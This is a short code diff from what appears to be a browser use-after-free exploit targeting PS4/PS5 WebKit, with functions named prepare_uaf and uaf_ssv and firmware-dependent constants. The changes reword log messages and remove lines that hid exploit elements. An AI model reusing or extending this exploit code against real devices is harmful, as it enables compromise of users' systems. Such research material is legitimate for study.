@@ -60,7 +60,7 @@ const [is_ps4, version] = (() => {
     throw RangeError(`invalid config.target: ${hex(value)}`);
   }
 
-  log(`Console: PS${is_ps4 ? "4" : "5"} | Firmware: ${hex(version)}`);
+  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 
   return [is_ps4, version];
 })();
@@ -81,7 +81,7 @@ const ssv_len = (() => {
   if (0x900 <= version) {
     return 0x50;
   }
-  throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? "4" : "5"}, version: ${hex(version)}`);
+  throw new RangeError(`unsupported: PS${is_ps4 ? "4" : "5"} | firmware ${hex(version)}`);
 })();
 
 // these constants are expected to be divisible by 2
@@ -147,7 +147,6 @@ function prepare_uaf() {
       const fset = document.createElement("frameset");
       fset.rows = rows;
       fset.cols = rows;
-      fset.style.opacity = 0;
       fsets.push(fset);
     }
   }
@@ -185,13 +184,10 @@ async function uaf_ssv(fsets, index, index2) {
   const views = [];
   const input = document.createElement("input");
   input.id = "input";
-  input.style.opacity = 0;
   const foo = document.createElement("input");
   foo.id = "foo";
-  foo.style.opacity = 0;
   const bar = document.createElement("a");
   bar.id = "bar";
-  bar.style.opacity = 0;
 
   log(`ssv_len: ${hex(ssv_len)}`);
 
